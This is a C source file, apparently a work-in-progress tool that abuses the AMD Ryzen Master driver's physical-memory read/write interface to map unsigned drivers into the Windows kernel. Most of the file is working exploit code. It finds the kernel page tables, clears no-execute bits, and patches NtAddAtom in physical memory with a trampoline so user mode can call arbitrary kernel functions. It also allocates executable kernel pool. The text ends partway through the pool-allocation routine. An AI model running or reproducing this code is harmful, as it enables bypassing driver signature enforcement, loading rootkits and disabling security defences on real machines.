/*
 * kdmap_amd.c — Unsigned kernel driver loader via AMDRyzenMasterDriver
 *
 * Concept: https://blog.quarkslab.com/exploiting-lenovo-driver-cve-2025-8061_part2.html
 * Reference implementation: https://github.com/TheCruZ/kdmapper
 *
 * v9 changes vs v8:
 *   - Removed SSDT hook path (KeServiceDescriptorTable is NOT exported — dead code)
 *   - call_kernel_fn() is the ONE caller for all kernel functions (already proven working)
 *   - Removed PAUSE inside call_kernel_fn; verbose detail gated by g_ckf_verbose
 *   - alloc_pool: try ExAllocatePool2(POOL_FLAG_NON_PAGED_EXECUTE=0x80) first →
 *     executable pool, no PTE patch needed even without CR3
 *   - kernel_write_via_mmpa: uses call_kernel_fn (MmGetPhysicalAddress) — fixed
 *   - map_driver Step E: skips NX clear when g_pool_is_exec == 1
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* ══════════════════════════════════════════════════════════════════════
 * PAUSE / LOG HELPERS
 * ══════════════════════════════════════════════════════════════════════ */

static void _pause(const char *tag, const char *msg)
{
    printf("\n");
    printf("┌──────────────────────────────────────────────────────────┐\n");
    printf("│  STEP %-52s │\n", tag);
    printf("│  %s\n", msg);
    printf("└──────────────────────────────────────────────────────────┘\n");
    printf("  >>> Press Enter to continue (Ctrl+C to abort) ... ");
    fflush(stdout);
    getchar();
    printf("\n");
}

#define PAUSE(tag, msg) _pause(tag, msg)

#define LOG_HEX(label, val) \
    printf("    %-36s 0x%016llX\n", (label), (unsigned long long)(val))

static void log_bytes(const char *label, const void *ptr, int n)
{
    const uint8_t *b = (const uint8_t*)ptr;
    printf("    %-36s", label);
    for (int i = 0; i < n; i++) printf("%02x ", b[i]);
    printf("\n");
}
#define LOG_BYTES(label, ptr, n) log_bytes(label, ptr, n)

/* ══════════════════════════════════════════════════════════════════════
 * §1  AMD DRIVER PRIMITIVES
 * ══════════════════════════════════════════════════════════════════════ */

#define DEVICE_NAME      L"\\\\.\\AMDRyzenMasterDriverV20"
#define IOCTL_PHYS_READ  0x81112F08u
#define IOCTL_PHYS_WRITE 0x81112F0Cu

static HANDLE g_dev = INVALID_HANDLE_VALUE;

#define MAX_RANGES 64
typedef struct { uint64_t base, size; } PhysRange;
static PhysRange g_ranges[MAX_RANGES];
static int       g_nranges = 0;

static void load_ranges(void)
{
    HKEY h;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "HARDWARE\\RESOURCEMAP\\System Resources\\Physical Memory",
        0, KEY_READ, &h) != ERROR_SUCCESS) return;
    char vname[256]; DWORD vn, vd, type;
    uint8_t *buf = NULL; DWORD sz = 0;
    for (DWORD i = 0;;i++) {
        vn = sizeof vname; vd = 0;
        if (RegEnumValueA(h,i,vname,&vn,NULL,&type,NULL,&vd)==ERROR_NO_MORE_ITEMS) break;
        if ((type!=3&&type!=8)||vd<20) continue;
        buf = (uint8_t*)malloc(vd);
        if (!buf) continue;
        if (RegQueryValueExA(h,vname,NULL,NULL,buf,&vd)==ERROR_SUCCESS){sz=vd;break;}
        free(buf); buf = NULL;
    }
    RegCloseKey(h);
    if (!buf||sz<20){free(buf);return;}
    DWORD cnt = *(DWORD*)(buf+16); uint8_t *p = buf+20;
    for (DWORD i = 0; i<cnt&&g_nranges<MAX_RANGES; i++,p+=20) {
        if (p+20>buf+sz||p[0]!=3) continue;
        g_ranges[g_nranges].base = *(uint64_t*)(p+4);
        g_ranges[g_nranges].size = *(uint64_t*)(p+12);
        g_nranges++;
    }
    free(buf);
}

static int pa_in_range(uint64_t pa, uint32_t sz)
{
    for (int i = 0; i < g_nranges; i++)
        if (pa>=g_ranges[i].base && pa+sz<=g_ranges[i].base+g_ranges[i].size) return 1;
    return 0;
}

static int pa_pte_safe(uint64_t pa, uint32_t sz) {
    if (pa_in_range(pa, sz)) return 1;
    if (pa >= 0x1000 && pa + sz <= 0x1000000ULL) return 1;
    return 0;
}

#define CHUNK_SZ 0x40000
static uint8_t g_io_out[12 + CHUNK_SZ];

static int phys_read(uint64_t pa, void *buf, uint32_t sz)
{
    uint8_t in[12]; *(uint64_t*)in = pa; *(uint32_t*)(in+8) = sz;
    uint32_t osz = 12+sz;
    uint8_t *out; void *dyn = NULL;
    if (osz <= sizeof g_io_out) out = g_io_out;
    else { dyn = malloc(osz); if (!dyn) return 0; out = (uint8_t*)dyn; }
    DWORD got = 0;
    BOOL ok = DeviceIoControl(g_dev, IOCTL_PHYS_READ, in, 12, out, osz, &got, NULL);
    if (ok && got >= 12) memcpy(buf, out+12, sz);
    free(dyn);
    return ok && got >= 12;
}

static int phys_write(uint64_t pa, const void *data, uint32_t sz)
{
    if (!pa_in_range(pa, sz)) return 0;
    uint32_t isz = 12+sz;
    uint8_t *in = (uint8_t*)malloc(isz); if (!in) return 0;
    *(uint64_t*)in = pa; *(uint32_t*)(in+8) = sz;
    memcpy(in+12, data, sz);
    DWORD got = 0;
    BOOL ok = DeviceIoControl(g_dev, IOCTL_PHYS_WRITE, in, isz, NULL, 0, &got, NULL);
    free(in);
    return ok;
}

/* ══════════════════════════════════════════════════════════════════════
 * §2  PAGE-TABLE WALKER  (CR3 → kernel VA → PA)
 * ══════════════════════════════════════════════════════════════════════ */

static uint64_t g_kernel_cr3    = 0;
static uint64_t g_ntoskrnl_va   = 0;
static uint64_t g_ntoskrnl_pa   = 0;
static uint8_t *g_ntoskrnl_pe   = NULL;
static DWORD    g_ntoskrnl_pe_sz = 0;
static uint32_t disk_export_rva(const char *func_name);

static uint64_t find_ntoskrnl_pa(void)
{
    uint32_t rva = disk_export_rva("NtBuildNumber");
    if (!rva) { printf("[-] NtBuildNumber not in disk PE\n"); return 0; }

    uint32_t ssd = *(uint32_t*)(0x7FFE0000 + 0x260) & 0xFFFF;
    uint32_t c0 = ssd, c1 = ssd|0xF0000000, c2 = ssd|0xC0000000;
    printf("    NtBuildNumber RVA=0x%X  live build=%u  candidates: 0x%X 0x%X 0x%X\n",
           rva, ssd, c0, c1, c2);

    const uint64_t STEP = 0x200000ULL;
    for (int ri = 0; ri < g_nranges; ri++) {
        uint64_t base = (g_ranges[ri].base + STEP-1) & ~(STEP-1);
        uint64_t end  = g_ranges[ri].base + g_ranges[ri].size;
        for (uint64_t pa = base; pa < end; pa += STEP) {
            if (!pa_in_range(pa + rva, 4)) continue;
            uint32_t v = 0; phys_read(pa + rva, &v, 4);
            if (v!=c0 && v!=c1 && v!=c2) continue;
            uint16_t mz = 0; phys_read(pa, &mz, 2);
            if (mz == 0x5A4D) {
                printf("[+] ntoskrnl PA=0x%llX (build %u)\n",
                       (unsigned long long)pa, ssd);
                return pa;
            }
        }
    }
    return 0;
}

static uint64_t find_kernel_cr3_verified(uint64_t nt_va, uint64_t nt_pa)
{
    if (!nt_va || !nt_pa) return 0;

    uint64_t pml4i = (nt_va >> 39) & 0x1FF;
    uint64_t pdpi  = (nt_va >> 30) & 0x1FF;
    uint64_t pdi   = (nt_va >> 21) & 0x1FF;
    uint64_t pti   = (nt_va >> 12) & 0x1FF;

    for (int ri = 0; ri < g_nranges; ri++) {
        uint64_t end = g_ranges[ri].base + g_ranges[ri].size;
        if (end > 0x1000000ULL) end = 0x1000000ULL;

        for (uint64_t pa = (g_ranges[ri].base+0xFFFULL)&~0xFFFULL;
             pa + 0x1000 <= end; pa += 0x1000)
        {
            uint64_t pml4e = 0;
            if (!phys_read(pa + pml4i*8, &pml4e, 8) || !(pml4e&1)) continue;
            uint64_t pdpt_pa = pml4e & 0x000FFFFFFFFFF000ULL;
            if (!pa_pte_safe(pdpt_pa, 0x1000)) continue;
            uint64_t pdpte   = 0;
            if (!phys_read(pdpt_pa + pdpi*8, &pdpte, 8) || !(pdpte&1)) continue;
            if (pdpte & (1ULL<<7)) {
                uint64_t mapped = (pdpte & 0x000FFFFFC0000000ULL) | (nt_va & 0x3FFFFFFF);
                if (mapped == nt_pa) { printf("[+] Kernel CR3=0x%llX (1GB page)\n",(unsigned long long)pa); return pa; }
                continue;
            }
            uint64_t pd_pa = pdpte & 0x000FFFFFFFFFF000ULL;
            if (!pa_pte_safe(pd_pa, 0x1000)) continue;
            uint64_t pde   = 0;
            if (!phys_read(pd_pa + pdi*8, &pde, 8) || !(pde&1)) continue;
            if (pde & (1ULL<<7)) {
                uint64_t mapped = (pde & 0x000FFFFFFFE00000ULL) | (nt_va & 0x1FFFFF);
                if (mapped == nt_pa) { printf("[+] Kernel CR3=0x%llX (2MB page)\n",(unsigned long long)pa); return pa; }
                continue;
            }
            uint64_t pt_pa = pde & 0x000FFFFFFFFFF000ULL;
            if (!pa_pte_safe(pt_pa, 0x1000)) continue;
            uint64_t pte   = 0;
            if (!phys_read(pt_pa + pti*8, &pte, 8) || !(pte&1)) continue;
            uint64_t mapped = (pte & 0x000FFFFFFFFFF000ULL) | (nt_va & 0xFFF);
            if (mapped == nt_pa) {
                printf("[+] Kernel CR3=0x%llX (4KB page)\n", (unsigned long long)pa);
                return pa;
            }
        }
    }
    return 0;
}

static uint64_t find_kernel_cr3(void)
{
    for (int ri = 0; ri < g_nranges; ri++) {
        if (g_ranges[ri].base >= 0x10000000ULL) continue;
        uint64_t re = g_ranges[ri].base + g_ranges[ri].size;
        if (re > 0x10000000ULL) re = 0x10000000ULL;
        for (uint64_t pa = g_ranges[ri].base; pa < re; pa += 0x1000) {
            uint64_t e = 0;
            if (!phys_read(pa + 0x1ED*8, &e, 8)) continue;
            if ((e&1) && (e&0x000FFFFFFFFFF000ULL)==pa) return pa;
        }
    }
    static uint8_t s_pg[4096];
    for (int ri = 0; ri < g_nranges; ri++) {
        if (g_ranges[ri].base >= 0x4000000ULL) continue;
        uint64_t re = g_ranges[ri].base + g_ranges[ri].size;
        if (re > 0x4000000ULL) re = 0x4000000ULL;
        for (uint64_t pa = g_ranges[ri].base; pa < re; pa += 0x1000) {
            if (!phys_read(pa, s_pg, 4096)) continue;
            for (int idx = 0x100; idx < 0x200; idx++) {
                uint64_t e = *(uint64_t*)(s_pg + idx*8);
                if (!(e&1)) continue;
                if ((e&0x000FFFFFFFFFF000ULL)==pa) return pa;
            }
        }
    }
    return 0;
}

static uint64_t va_to_pa(uint64_t va)
{
    if (!g_kernel_cr3) return 0;
    uint64_t pml4i=(va>>39)&0x1FF, pdpi=(va>>30)&0x1FF;
    uint64_t pdi  =(va>>21)&0x1FF, pti =(va>>12)&0x1FF;
    uint64_t e = 0;
    if (!phys_read(g_kernel_cr3+pml4i*8,&e,8)||!(e&1)) return 0;
    if (!phys_read((e&0x000FFFFFFFFFF000ULL)+pdpi*8,&e,8)||!(e&1)) return 0;
    if (e&(1ULL<<7)) return (e&0x000FFFFFC0000000ULL)|(va&0x3FFFFFFF);
    if (!phys_read((e&0x000FFFFFFFFFF000ULL)+pdi*8,&e,8)||!(e&1)) return 0;
    if (e&(1ULL<<7)) return (e&0x000FFFFFFFE00000ULL)|(va&0x1FFFFF);
    if (!phys_read((e&0x000FFFFFFFFFF000ULL)+pti*8,&e,8)||!(e&1)) return 0;
    return (e&0x000FFFFFFFFFF000ULL)|(va&0xFFF);
}

static uint64_t va_to_pte_pa(uint64_t va, uint64_t *out_pte_val)
{
    if (!g_kernel_cr3) return 0;
    uint64_t pml4i=(va>>39)&0x1FF, pdpi=(va>>30)&0x1FF;
    uint64_t pdi  =(va>>21)&0x1FF, pti =(va>>12)&0x1FF;
    uint64_t e = 0;

    if (!phys_read(g_kernel_cr3+pml4i*8,&e,8)||!(e&1)) return 0;
    uint64_t pdpt_pa = e & 0x000FFFFFFFFFF000ULL;

    if (!phys_read(pdpt_pa+pdpi*8,&e,8)||!(e&1)) return 0;
    if (e&(1ULL<<7)) {
        if (out_pte_val) *out_pte_val = e;
        return pdpt_pa + pdpi*8;
    }
    uint64_t pd_pa = e & 0x000FFFFFFFFFF000ULL;

    if (!phys_read(pd_pa+pdi*8,&e,8)||!(e&1)) return 0;
    if (e&(1ULL<<7)) {
        if (out_pte_val) *out_pte_val = e;
        return pd_pa + pdi*8;
    }
    uint64_t pt_pa = e & 0x000FFFFFFFFFF000ULL;

    if (!phys_read(pt_pa+pti*8,&e,8)||!(e&1)) return 0;
    if (out_pte_val) *out_pte_val = e;
    return pt_pa + pti*8;
}

/* ══════════════════════════════════════════════════════════════════════
 * §3  KERNEL MEMORY READ / WRITE  (page-boundary-aware)
 * ══════════════════════════════════════════════════════════════════════ */

static int kernel_read(uint64_t kva, void *buf, size_t size)
{
    uint8_t *dst = (uint8_t*)buf;
    while (size > 0) {
        uint64_t off   = kva & 0xFFF;
        size_t   chunk = 0x1000 - off;
        if (chunk > size) chunk = size;
        uint64_t pa = va_to_pa(kva);
        if (!pa || !phys_read(pa, dst, (uint32_t)chunk)) return 0;
        dst  += chunk; kva  += chunk; size -= chunk;
    }
    return 1;
}

static int kernel_write(uint64_t kva, const void *buf, size_t size)
{
    const uint8_t *src = (const uint8_t*)buf;
    while (size > 0) {
        uint64_t off   = kva & 0xFFF;
        size_t   chunk = 0x1000 - off;
        if (chunk > size) chunk = size;
        uint64_t pa = va_to_pa(kva);
        if (!pa || !phys_write(pa, src, (uint32_t)chunk)) return 0;
        src  += chunk; kva  += chunk; size -= chunk;
    }
    return 1;
}

/* forward declaration — call_kernel_fn defined in §6 */
static uint64_t call_kernel_fn(uint64_t fn_kva,
                                uint64_t a1, uint64_t a2,
                                uint64_t a3, uint64_t a4);

/*
 * kernel_write_via_mmpa — write to kernel pool without CR3.
 * Calls MmGetPhysicalAddress via NtAddAtom trampoline for each pool page,
 * then phys_write directly.
 */
static int kernel_write_via_mmpa(uint64_t pool_kva, const void *src_buf, size_t size)
{
    uint32_t mmpa_rva = disk_export_rva("MmGetPhysicalAddress");
    if (!mmpa_rva || !g_ntoskrnl_va) {
        printf("[-] MmGetPhysicalAddress not found in disk PE\n"); return 0;
    }
    uint64_t fn_mmpa = g_ntoskrnl_va + mmpa_rva;
    const uint8_t *src = (const uint8_t*)src_buf;
    size_t done = 0;
    while (done < size) {
        uint64_t page_va  = pool_kva + done;
        uint64_t page_off = page_va & 0xFFF;
        uint64_t aligned  = page_va & ~0xFFFULL;
        size_t   chunk    = 0x1000 - page_off;
        if (chunk > size - done) chunk = size - done;

        uint64_t page_pa = call_kernel_fn(fn_mmpa, aligned, 0, 0, 0);
        if (!page_pa) {
            printf("[-] MmGetPhysicalAddress(0x%llX) = 0\n", (unsigned long long)aligned);
            return 0;
        }
        if (!phys_write(page_pa + page_off, src + done, (uint32_t)chunk)) {
            printf("[-] phys_write pool PA=0x%llX+0x%llX failed\n",
                   (unsigned long long)page_pa, (unsigned long long)page_off);
            return 0;
        }
        done += chunk;
    }
    printf("[+] kernel_write_via_mmpa: wrote 0x%llX bytes OK\n", (unsigned long long)size);
    return 1;
}

/*
 * make_pool_executable — clear XD/NX bit (bit 63) from every PTE in pool range.
 * Only called when g_kernel_cr3 != 0 AND g_pool_is_exec == 0.
 */
static void make_pool_executable(uint64_t pool_kva, DWORD size)
{
    printf("    Iterating PTEs for 0x%llX + 0x%lX:\n",
           (unsigned long long)pool_kva, (unsigned long)size);

    uint32_t cleared = 0, already_x = 0, failed = 0;
    uint64_t va  = pool_kva & ~0xFFFULL;
    uint64_t end = (pool_kva + size + 0xFFF) & ~0xFFFULL;

    while (va < end) {
        uint64_t pte_val = 0;
        uint64_t pte_pa  = va_to_pte_pa(va, &pte_val);
        uint64_t step    = 0x1000;

        if (!pte_pa) {
            printf("      VA=0x%llX  pte_pa=NULL (walk failed)\n", (unsigned long long)va);
            failed++;
            va += step;
            continue;
        }

        {
            uint64_t pml4i=(va>>39)&0x1FF, pdpi=(va>>30)&0x1FF, pdi=(va>>21)&0x1FF;
            uint64_t e = 0;
            phys_read(g_kernel_cr3+pml4i*8,&e,8);
            uint64_t p1 = e & 0x000FFFFFFFFFF000ULL;
            phys_read(p1+pdpi*8,&e,8);
            if (e&(1ULL<<7)) step = 0x40000000ULL;
            else {
                uint64_t p2 = e & 0x000FFFFFFFFFF000ULL;
                phys_read(p2+pdi*8,&e,8);
                if (e&(1ULL<<7)) step = 0x200000ULL;
            }
        }

        int nx_set = (pte_val >> 63) & 1;
        printf("      VA=0x%llX  pte_pa=0x%llX  pte=0x%016llX  NX=%d",
               (unsigned long long)va,
               (unsigned long long)pte_pa,
               (unsigned long long)pte_val,
               nx_set);

        if (nx_set) {
            uint64_t new_pte = pte_val & ~(1ULL<<63);
            if (phys_write(pte_pa, &new_pte, 8)) {
                uint64_t rb = 0;
                phys_read(pte_pa, &rb, 8);
                if (rb == new_pte) {
                    printf("  → cleared OK (rb=0x%llX)\n", (unsigned long long)rb);
                    cleared++;
                } else {
                    printf("  → WRITE VERIFY FAILED (rb=0x%llX)\n", (unsigned long long)rb);
                    failed++;
                }
            } else {
                printf("  → phys_write FAILED\n");
                failed++;
            }
        } else {
            printf("  → already X\n");
            already_x++;
        }
        va += step;
    }
    printf("    Summary: cleared=%u  already_exec=%u  failed=%u\n",
           cleared, already_x, failed);
}

/* ══════════════════════════════════════════════════════════════════════
 * §4  KERNEL MODULE MAP
 * ══════════════════════════════════════════════════════════════════════ */

typedef NTSTATUS (NTAPI *PFN_NTQSI)(ULONG,PVOID,ULONG,PULONG);
typedef struct {
    HANDLE Section; PVOID MappedBase, ImageBase;
    ULONG  ImageSize, Flags;
    USHORT LoadOrderIndex, InitOrderIndex, LoadCount, OffsetToFileName;
    CHAR   FullPathName[256];
} MOD_ENTRY;
typedef struct { ULONG NumberOfModules; MOD_ENTRY Modules[1]; } MOD_LIST;

static MOD_LIST *get_module_list(void)
{
    PFN_NTQSI fn = (PFN_NTQSI)GetProcAddress(GetModuleHandleA("ntdll.dll"),
                                               "NtQuerySystemInformation");
    if (!fn) return NULL;
    ULONG sz = 0x80000; MOD_LIST *ml = NULL; NTSTATUS st;
    do { free(ml); ml = (MOD_LIST*)malloc(sz*=2); st = fn(11,ml,sz,NULL); }
    while (st == (NTSTATUS)0xC0000004L);
    if (st) { free(ml); return NULL; }
    return ml;
}

static uint64_t get_kernel_module_base(const char *name)
{
    MOD_LIST *ml = get_module_list(); if (!ml) return 0;
    uint64_t result = 0;
    for (ULONG i = 0; i < ml->NumberOfModules; i++) {
        const char *fn = ml->Modules[i].FullPathName + ml->Modules[i].OffsetToFileName;
        if (_stricmp(fn, name) == 0) { result = (uint64_t)ml->Modules[i].ImageBase; break; }
    }
    free(ml);
    return result;
}

/* ══════════════════════════════════════════════════════════════════════
 * §5  LIVE KERNEL EXPORT RESOLUTION
 * ══════════════════════════════════════════════════════════════════════ */

static uint64_t get_kernel_export(uint64_t module_kva, const char *func_name)
{
    if (!module_kva || !func_name) return 0;
    IMAGE_DOS_HEADER dos;
    if (!kernel_read(module_kva, &dos, sizeof dos) || dos.e_magic != IMAGE_DOS_SIGNATURE) return 0;
    IMAGE_NT_HEADERS64 nt;
    if (!kernel_read(module_kva + dos.e_lfanew, &nt, sizeof nt) || nt.Signature != IMAGE_NT_SIGNATURE) return 0;
    DWORD exp_rva = nt.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    DWORD exp_sz  = nt.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
    if (!exp_rva || !exp_sz) return 0;
    IMAGE_EXPORT_DIRECTORY exp;
    if (!kernel_read(module_kva + exp_rva, &exp, sizeof exp)) return 0;
    DWORD n = exp.NumberOfNames;
    DWORD *name_rvas = (DWORD*)malloc(n * 4);
    WORD  *ordinals  = (WORD*) malloc(n * 2);
    DWORD *func_rvas = (DWORD*)malloc(exp.NumberOfFunctions * 4);
    if (!name_rvas || !ordinals || !func_rvas) goto cleanup_null;
    if (!kernel_read(module_kva + exp.AddressOfNames,        name_rvas, n * 4)) goto cleanup_null;
    if (!kernel_read(module_kva + exp.AddressOfNameOrdinals, ordinals,  n * 2)) goto cleanup_null;
    if (!kernel_read(module_kva + exp.AddressOfFunctions,    func_rvas, exp.NumberOfFunctions * 4)) goto cleanup_null;
    {
        uint64_t result = 0;
        for (DWORD i = 0; i < n && !result; i++) {
            char name_buf[256] = {0};
            if (!kernel_read(module_kva + name_rvas[i], name_buf, sizeof name_buf-1)) continue;
            if (strcmp(name_buf, func_name) != 0) continue;
            WORD ord = ordinals[i];
            if (ord >= exp.NumberOfFunctions) continue;
            DWORD frva = func_rvas[ord];
            if (!frva) continue;
            if (frva >= exp_rva && frva < exp_rva + exp_sz) continue;
            result = module_kva + frva;
        }
        free(name_rvas); free(ordinals); free(func_rvas);
        return result;
    }
cleanup_null:
    free(name_rvas); free(ordinals); free(func_rvas);
    return 0;
}

static uint32_t rva_to_file_off(const uint8_t *pe, size_t fsz, uint32_t rva)
{
    int32_t elf = *(int32_t*)(pe + 0x3C);
    if (elf < 0 || (size_t)elf + 0x06 > fsz) return 0;
    uint16_t nsec  = *(uint16_t*)(pe + elf + 6);
    uint16_t optsz = *(uint16_t*)(pe + elf + 20);
    uint32_t sec_off = (uint32_t)elf + 24 + optsz;
    for (uint16_t i = 0; i < nsec; i++) {
        uint32_t o = sec_off + i * 40;
        if (o + 40 > fsz) break;
        uint32_t va  = *(uint32_t*)(pe + o + 12);
        uint32_t vsz = *(uint32_t*)(pe + o + 16);
        uint32_t raw = *(uint32_t*)(pe + o + 20);
        if (rva >= va && rva < va + vsz && raw) return raw + (rva - va);
    }
    return rva;
}

/* pe_export_rva — parse any in-memory disk PE image, find export RVA by name.
 * Used for ntoskrnl (g_ntoskrnl_pe) and any other module loaded from disk.
 * No CR3 / kernel_read needed. */
static uint32_t pe_export_rva(const uint8_t *pe, size_t fsz, const char *sym)
{
    if (!pe || fsz < 0x100 || pe[0]!='M' || pe[1]!='Z') return 0;
    int32_t e_lfanew = *(int32_t*)(pe + 0x3C);
    if (e_lfanew < 0x40 || (size_t)e_lfanew + 0x90 > fsz) return 0;
    if (*(uint32_t*)(pe + e_lfanew) != 0x00004550) return 0;
    uint16_t magic = *(uint16_t*)(pe + e_lfanew + 0x18);
    uint32_t exp_dir_rva = (magic == 0x020B)
        ? *(uint32_t*)(pe + e_lfanew + 0x88)
        : *(uint32_t*)(pe + e_lfanew + 0x78);
    if (!exp_dir_rva) return 0;
    uint32_t exp_dir_off = rva_to_file_off(pe, fsz, exp_dir_rva);
    if (!exp_dir_off || exp_dir_off + sizeof(IMAGE_EXPORT_DIRECTORY) > fsz) return 0;
    const IMAGE_EXPORT_DIRECTORY *ed = (const IMAGE_EXPORT_DIRECTORY*)(pe + exp_dir_off);
    uint32_t names_off = rva_to_file_off(pe, fsz, ed->AddressOfNames);
    uint32_t ords_off  = rva_to_file_off(pe, fsz, ed->AddressOfNameOrdinals);
    uint32_t funcs_off = rva_to_file_off(pe, fsz, ed->AddressOfFunctions);
    if (!names_off || !ords_off || !funcs_off) return 0;
    if (names_off + ed->NumberOfNames*4     > fsz) return 0;
    if (ords_off  + ed->NumberOfNames*2     > fsz) return 0;
    if (funcs_off + ed->NumberOfFunctions*4 > fsz) return 0;
    const DWORD *names = (const DWORD*)(pe + names_off);
    const WORD  *ords  = (const WORD *)(pe + ords_off);
    const DWORD *funcs = (const DWORD*)(pe + funcs_off);
    for (DWORD i = 0; i < ed->NumberOfNames; i++) {
        uint32_t name_off = rva_to_file_off(pe, fsz, names[i]);
        if (!name_off || name_off >= fsz) continue;
        if (strcmp((const char*)(pe + name_off), sym)) continue;
        WORD ord = ords[i];
        if (ord >= ed->NumberOfFunctions) continue;
        return funcs[ord];
    }
    return 0;
}

static uint32_t disk_export_rva(const char *sym)
{
    return pe_export_rva(g_ntoskrnl_pe, g_ntoskrnl_pe_sz, sym);
}

/* load_module_disk_pe — read a kernel module's disk image into a malloc'd buffer.
 * Searches System32 then System32\drivers. Caller must free() the result. */
static uint8_t *load_module_disk_pe(const char *mod_name, DWORD *out_sz)
{
    char sysdir[MAX_PATH];
    GetSystemDirectoryA(sysdir, sizeof sysdir);
    const char *subdirs[] = { "", "\\drivers" };
    for (int i = 0; i < 2; i++) {
        char path[MAX_PATH*2];
        snprintf(path, sizeof path, "%s%s\\%s", sysdir, subdirs[i], mod_name);
        HANDLE hf = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ,
                                NULL, OPEN_EXISTING, 0, NULL);
        if (hf == INVALID_HANDLE_VALUE) continue;
        DWORD fsz = GetFileSize(hf, NULL);
        uint8_t *buf = (uint8_t*)malloc(fsz);
        if (!buf) { CloseHandle(hf); continue; }
        DWORD rd = 0;
        ReadFile(hf, buf, fsz, &rd, NULL);
        CloseHandle(hf);
        *out_sz = fsz;
        return buf;
    }
    return NULL;
}

/* ══════════════════════════════════════════════════════════════════════
 * §6  KERNEL FUNCTION CALLER  (NtAddAtom trampoline — sole mechanism)
 *
 * How it works:
 *   1. Compute NtAddAtom PA = ntoskrnl_pa + disk_export_rva("NtAddAtom")
 *      No CR3/va_to_pa needed — ntoskrnl is contiguous in physical memory.
 *   2. phys_write 12-byte trampoline: movabs rax, fn_kva; jmp rax
 *   3. Call NtAddAtom() from userland with target's args in RCX/RDX/R8/R9
 *      → syscall → KiSystemCall64 → patched NtAddAtom → trampoline → fn_kva
 *   4. phys_write original bytes back
 *
 * Arg mapping (x64 fastcall):
 *   a1 → RCX,  a2 → RDX,  a3 → R8,  a4 → R9
 *   return value in RAX (uint64_t)
 *
 * Set g_ckf_verbose=1 before calling to get detailed output (for self-test).
 * ══════════════════════════════════════════════════════════════════════ */

static uint64_t g_ntaddatom_kva = 0;
static int      g_ckf_verbose   = 0;

static int init_ntaddatom(void)
{
    if (g_ntaddatom_kva) return 1;
    uint32_t rva = disk_export_rva("NtAddAtom");
    if (!rva) {
        g_ntaddatom_kva = get_kernel_export(g_ntoskrnl_va, "NtAddAtom");
        return g_ntaddatom_kva != 0;
    }
    g_ntaddatom_kva = g_ntoskrnl_va + rva;
    return 1;
}

static uint64_t call_kernel_fn(uint64_t fn_kva,
                                uint64_t a1, uint64_t a2,
                                uint64_t a3, uint64_t a4)
{
    if (!fn_kva) return 0;
    if (!init_ntaddatom()) { printf("[-] NtAddAtom kva init failed\n"); return 0; }

    /* NtAddAtom PA via ntoskrnl identity: no CR3 needed */
    uint64_t ntaddatom_pa = g_ntoskrnl_pa
        ? (g_ntoskrnl_pa + disk_export_rva("NtAddAtom"))
        : va_to_pa(g_ntaddatom_kva);
    if (!ntaddatom_pa) {
        printf("[-] NtAddAtom PA not found (ntoskrnl_pa=0x%llX)\n",
               (unsigned long long)g_ntoskrnl_pa);
        return 0;
    }

    uint8_t orig[12];
    if (!phys_read(ntaddatom_pa, orig, 12)) return 0;

    if (orig[0]==0x48 && orig[1]==0xb8 && orig[10]==0xff && orig[11]==0xe0) {
        printf("[-] NtAddAtom already has a trampoline — aborting\n");
        return 0;
    }

    uint8_t tramp[12] = {0x48, 0xb8, 0,0,0,0,0,0,0,0, 0xff, 0xe0};
    *(uint64_t*)(tramp+2) = fn_kva;

    if (g_ckf_verbose) {
        printf("    [CKF] target=0x%llX  atom_pa=0x%llX\n",
               (unsigned long long)fn_kva, (unsigned long long)ntaddatom_pa);
        LOG_BYTES("    [CKF] orig bytes ", orig, 12);
        printf("    [CKF] tramp bytes: 48 b8 [target] ff e0\n");
    }

    if (!phys_write(ntaddatom_pa, tramp, 12)) {
        printf("[-] phys_write trampoline FAILED\n");
        return 0;
    }

    if (g_ckf_verbose) {
        uint8_t chk[12] = {0};
        phys_read(ntaddatom_pa, chk, 12);
        LOG_BYTES("    [CKF] readback  ", chk, 12);
        LOG_BYTES("    [CKF] expected  ", tramp, 12);
        if (memcmp(chk, tramp, 12) != 0) {
            printf("[-] Trampoline verify FAILED — write did not land\n");
            phys_write(ntaddatom_pa, orig, 12);
            return 0;
        }
        printf("    [CKF] verify OK — trampoline in RAM\n");
    }

    typedef uint64_t (__stdcall *KFn)(uint64_t, uint64_t, uint64_t, uint64_t);
    KFn ntaddatom = (KFn)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAddAtom");
    uint64_t result = ntaddatom ? ntaddatom(a1, a2, a3, a4) : 0;

    if (g_ckf_verbose)
        printf("    [CKF] syscall returned 0x%llX\n", (unsigned long long)result);

    phys_write(ntaddatom_pa, orig, 12);

    if (g_ckf_verbose)
        printf("    [CKF] original bytes restored\n");

    return result;
}

/* ══════════════════════════════════════════════════════════════════════
 * §7  KERNEL POOL
 *
 * alloc_pool strategy:
 *   1. Try ExAllocatePool2(POOL_FLAG_NON_PAGED_EXECUTE=0x80, size, tag)
 *      → directly executable pool, no PTE manipulation needed.
 *      Available since Win10 20H1 (build 19041). Sets g_pool_is_exec=1.
 *   2. Fallback: ExAllocatePoolWithTag(NonPagedPool=0, size, tag)
 *      → NX pool on Win10 1511+, requires PTE clear via make_pool_executable.
 *      Sets g_pool_is_exec=0. Only usable when g_kernel_cr3 != 0.
 * ══════════════════════════════════════════════════════════════════════ */

#define POOL_TAG     0x45747742u
#define NonPagedPool 0

static int g_pool_is_exec = 0;

static uint64_t alloc_pool(uint64_t size)
{
    /* Try ExAllocatePool2 first — gives RWX pool, no PTE hack needed */
    uint32_t rva2 = disk_export_rva("ExAllocatePool2");
    if (rva2) {
        uint64_t fn = g_ntoskrnl_va + rva2;
        printf("[*] alloc_pool: ExAllocatePool2(POOL_FLAG_NON_PAGED_EXECUTE=0x80, 0x%llX)\n",
               (unsigned long long)size);
        /* ExAllocatePool2(ULONG64 Flags, SIZE_T size, ULONG tag) */
        uint64_t result = call_kernel_fn(fn, 0x80ULL, size, (uint64_t)POOL_TAG, 0);
        if (result) {
            printf("[+] ExAllocatePool2 → pool_kva=0x%llX (executable)\n",
                   (unsigned long long)result);
            g_pool_is_exec = 1;
            return result;
        }
